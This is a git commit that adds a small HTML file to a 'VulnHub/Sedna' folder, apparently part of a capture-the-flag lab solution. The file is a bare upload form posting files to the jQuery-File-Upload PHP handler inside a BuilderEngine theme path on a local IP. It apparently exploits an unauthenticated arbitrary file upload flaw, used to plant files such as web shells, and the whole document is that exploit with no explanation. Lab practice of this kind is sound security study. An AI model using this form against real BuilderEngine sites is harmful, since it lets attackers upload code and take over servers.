99be6cb4ebe7dbeeb7305d9f47806d07b490a73d
Vishal Biswas <34629291+CyberKnight00@users.noreply.github.com>
2019-09-01 18:26:32 +0530

    Add files via upload

---
+++ VulnHub/Sedna/BuilderEngine.php
@@ -0,0 +1,8 @@
+<html>
+<body>
+<form method="post" action="http://192.168.0.113/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data">
+	<input type="file" name="files[]" />
+	<input type="submit" value="send" />
+</form>
+</body>
+</html>
